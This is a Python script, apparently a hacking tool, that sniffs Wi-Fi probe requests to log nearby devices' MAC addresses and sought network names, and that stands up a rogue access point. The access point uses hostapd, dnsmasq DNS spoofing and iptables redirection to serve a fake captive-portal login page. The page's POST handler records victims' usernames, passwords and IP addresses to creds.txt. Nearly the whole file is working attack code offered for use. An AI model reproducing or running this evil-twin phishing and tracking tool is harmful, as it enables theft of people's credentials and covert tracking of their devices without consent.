import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11ProbeReq, Dot11Elt
import subprocess
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

class Extract_Probes:
	def __init__(self, interface):
		self.interface = interface
		self.discovered = []

	def rssi_decision(self, rssi):
	#	rssi = int(rssi.replace(@))
		if rssi >= -30:
			statement = '(very strong)'
		elif rssi >= -40:
			statement = '(strong)'
		elif rssi >= -60:
			statement = '(good)'
		elif rssi >= -70:
			statement = '(weak)'
		elif rssi >= -80:
			statement = '(very weak)'
		else:
			statement = '(extremely weak)'
		return str(rssi) + statement

	def enable_monitor_mode(self):
		subprocess.call("sudo nmcli dev set " + self.interface + " managed no", shell=True)
		subprocess.call("sudo ip link set " + self.interface + " down", shell=True)
		subprocess.call("sudo iw dev " + self.interface + " set type monitor", shell=True)
		subprocess.call("sudo ip link set " + self.interface + " up", shell=True)

	def filter_probes(self, packet):
		if packet.haslayer(Dot11ProbeReq):
			#packet.show()
			ssid = str(packet[Dot11Elt].info.decode())
			sender = str(packet[Dot11].addr2)
			rssi = int(packet[scapy.RadioTap].dBm_AntSignal)
			if ssid != '' and sender != '':
				probe_data = [ssid, sender]
				if probe_data not in self.discovered:
					rssi_statement = self.rssi_decision(rssi)
					self.discovered.append([ssid, sender])
					print('[+]From: ' + sender + ' - rssi: ' + rssi_statement + ' - AP request: ' + ssid)
					print('-------------------------------------------------------------')

	def sniff(self):
		scapy.sniff(iface=self.interface, prn=self.filter_probes, store=False)

class HTTP_Server(BaseHTTPRequestHandler):
	def do_GET(self):
		with open("./captive_portal_docs/login.html", "r") as file:
			PORTAL_CODE = file.read()
			file.close()
		"""
		PORTAL_CODE = '''
			<html>
			<head><title>Captive portal</title></head>
			<body>
				<h1>Welcome to the Captive portal of some kind</h1>
				<p>Please login in order to access the internet</p>
			</body>
			</html>'''
		"""
		self.send_response(200)
		self.send_header('Content-Type', 'text/html')
		self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
		self.end_headers()
		self.wfile.write(PORTAL_CODE.encode())

	def do_POST(self):
		#client_ip = self.client_address[0]
		length = int(self.headers.get("Content-Length", 0))
		body = self.rfile.read(length).decode(errors="ignore")
		fields = {}
		for pair in body.split("&"):
			if "=" in pair:
				k, v = pair.split("=", 1)
				fields[k] = v.replace("+", " ")

		username = fields.get("username")
		password = fields.get("password")
		entry = "ip: " + str(self.client_address[0]) + "\nusername: " + str(username) + "\npassword: " + str(password) + "\ntime: " + str(time.strftime("%Y-%m-%d %H:%M:%S")) + "\n\n\n"
		with open("creds.txt", "a") as file:
			file.write(entry) 
		print("[+]Credentials found:" + str(entry))
		self.send_response(200)
		self.send_header("Content-Type", "text/html")
		self.end_headers()
		with open("./captive_portal_docs/next.html", "r") as file:
			NEXT_PAGE_CODE = file.read()
			file.close()
		self.wfile.write(NEXT_PAGE_CODE.encode())

	def log_message(self, format, *args):
		pass

class Captive_Portal:
	def __init__(self, interface, ssid):
		self.interface = interface
		self.ssid = ssid
		self.PORT = 80

	def setup_interface(self):
		subprocess.run(['sudo', 'nmcli', 'dev', 'set', self.interface, 'managed', 'no'])
		time.sleep(1)
		subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'])
		time.sleep(1)
		subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', self.interface])
		time.sleep(1)
		subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.0.1/24', 'dev', self.interface])
		time.sleep(1)
		subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'])
		time.sleep(1)

	def run_hostapd(self):
		hostapd_config = f'interface={self.interface}\nssid={self.ssid}\nhw_mode=g\nchannel=6\nwmm_enabled=1\nauth_algs=1\nignore_broadcast_ssid=0\nctrl_interface=/var/run/hostapd'
		with open('hostapd.conf', 'w') as file:
			file.write(hostapd_config)
		subprocess.Popen(['sudo', 'hostapd', '-B', 'hostapd.conf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	def run_dnsmasq(self):
		dnsmasq_config = f'interface={self.interface}\ndhcp-range=192.168.0.50,192.168.0.200,12h\naddress=/#/192.168.0.1'
		with open('dnsmasq.conf', 'w') as file:
			file.write(dnsmasq_config)
		subprocess.Popen(['sudo', 'dnsmasq', '-C', 'dnsmasq.conf'])

	def redirect(self):
		subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'])
		subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.interface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '80'])
		subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])

	def start_http_server(self):
		HTTPServer(('', self.PORT), HTTP_Server).serve_forever()



while True:
	try:
		print('\n1. Sniff Network Probes\n2. Open Captive Portal\n3. Exit')
		result = input(">> ")
		if result == "1":
			interface = input("enter interface name: ")
			extractor = Extract_Probes(interface)
			extractor.enable_monitor_mode()
			extractor.sniff()
		elif result == "2":
			interface = input("enter interface name: ")
			ap_name = input("enter access point name: ")
			portal = Captive_Portal(interface, ap_name)
			portal.setup_interface()
			portal.run_hostapd()
			portal.run_dnsmasq()
			portal.redirect()
			portal.start_http_server()
		elif result == "3":
			subprocess.call("sudo pkill hostapd", shell=True)
			subprocess.call("sudo pkill dnsmasq", shell=True)
			subprocess.call("sudo iptables --flush", shell=True)
			exit()
		else:
			print("[-]invalid input")
			continue

			#http_server = HTTP_Server()
			#http_server.run_server()
			#HTTPServer(('', 80), HTTP_Server).serve_forever()
	except Exception as e:
		print("[!]Error: " + str(e))
		continue
